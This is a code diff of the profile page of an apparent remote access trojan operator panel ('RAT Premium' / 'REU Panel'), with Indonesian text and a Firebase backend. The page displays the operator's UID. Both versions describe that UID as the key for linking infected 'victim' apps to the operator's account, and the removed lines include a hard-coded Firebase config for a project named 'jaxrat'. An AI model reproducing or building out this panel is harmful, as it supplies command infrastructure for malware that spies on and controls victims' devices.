@@ -1,112 +1,45 @@
+<!-- PATH: /profile.html -->
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Profile - RAT Premium</title>
-    <link rel="stylesheet" href="css/style.css">
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #f5f6fa; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .profile-card { background: white; border-radius: 10px; padding: 40px; max-width: 500px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
-        h1 { margin-bottom: 30px; color: #2c3e50; }
-        .info { margin-bottom: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px; }
-        .info label { display: block; color: #7f8c8d; font-size: 14px; margin-bottom: 5px; }
-        .info .value { font-family: monospace; font-size: 16px; color: #2c3e50; word-break: break-all; }
-        .btn-back, .btn-logout { display: inline-block; padding: 10px 20px; margin: 5px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; }
-        .btn-back { background: #3498db; color: white; }
-        .btn-logout { background: #e74c3c; color: white; }
-        .warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; margin-top: 20px; }
-    </style>
+    <title>Profile - REU Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="profile-card">
-        <h1>👤 Profile Information</h1>
-        
-        <div id="profileContent">
-            <div class="info">
-                <label>Loading...</label>
-                <div class="value">Please wait...</div>
-            </div>
-        </div>
-        
-        <div style="margin-top: 30px; text-align: center;">
-            <a href="dashboard.html" class="btn-back">← Back to Dashboard</a>
-            <button id="logoutBtn" class="btn-logout">🚪 Logout</button>
-        </div>
-        
-        <div class="warning">
-            ⚠️ Jangan bagikan informasi ini ke siapapun!
+    <div class="navbar">
+        <h2>REU Panel</h2>
+        <div>
+            <a href="dashboard.html">Dashboard</a>
+            <a href="profile.html">Profile</a>
+            <button onclick="logout()">Logout</button>
         </div>
     </div>
 
+    <div class="container">
+        <h1>Profile Saya</h1>
+        <div id="profile-info">Loading...</div>
+    </div>
+
+    <script src="firebase-config.js"></script>
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
-            authDomain: "jaxrat-6813c.firebaseapp.com",
-            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
-            projectId: "jaxrat-6813c",
-            storageBucket: "jaxrat-6813c.firebasestorage.app",
-            messagingSenderId: "750985295231",
-            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
-        };
-
-        firebase.initializeApp(firebaseConfig);
-
-        // Check auth
-        firebase.auth().onAuthStateChanged((user) => {
-            const profileContent = document.getElementById('profileContent');
-            
-            if (!user) {
-                // Cek session
-                const isLoggedIn = sessionStorage.getItem('isLoggedIn');
-                if (!isLoggedIn) {
-                    window.location.replace('index.html');
-                    return;
-                }
-                
-                // Tampilkan dari session
-                profileContent.innerHTML = `
-                    <div class="info">
-                        <label>Email (from session)</label>
-                        <div class="value">${sessionStorage.getItem('userEmail') || 'Unknown'}</div>
-                    </div>
-                    <div class="info">
-                        <label>UID (from session)</label>
-                        <div class="value">${sessionStorage.getItem('userUid') || 'Unknown'}</div>
-                    </div>
+        auth.onAuthStateChanged(user => {
+            if (!user) window.location.href = 'index.html';
+            else {
+                document.getElementById('profile-info').innerHTML = `
+                    <p><strong>Email:</strong> ${user.email}</p>
+                    <p><strong>UID Firebase:</strong> ${user.uid} <button onclick="copyUID()">Copy</button></p>
+                    <p><strong>Email Terverifikasi:</strong> ${user.emailVerified ? 'Ya' : 'Tidak'}</p>
+                    <hr>
+                    <h3>⚠️ Simpan baik-baik UID lo. Itu adalah kunci utama buat nyambungin aplikasi victim.</h3>
                 `;
-                return;
             }
-            
-            // Tampilkan dari Firebase
-            profileContent.innerHTML = `
-                <div class="info">
-                    <label>Email</label>
-                    <div class="value">${user.email}</div>
-                </div>
-                <div class="info">
-                    <label>UID Firebase</label>
-                    <div class="value">${user.uid}</div>
-                </div>
-                <div class="info">
-                    <label>Custom UID untuk Victim</label>
-                    <div class="value">${user.uid}</div>
-                    <small style="color: #7f8c8d;">Gunakan UID ini di app.json</small>
-                </div>
-            `;
         });
 
-        // Logout
-        document.getElementById('logoutBtn').addEventListener('click', async () => {
-            await firebase.auth().signOut();
-            sessionStorage.clear();
-            window.location.replace('index.html');
-        });
+        function logout() { auth.signOut().then(() => window.location.href = 'index.html'); }
+        function copyUID() { navigator.clipboard.writeText(auth.currentUser.uid); alert('UID dicopy!'); }
     </script>
 </body>
 </html>
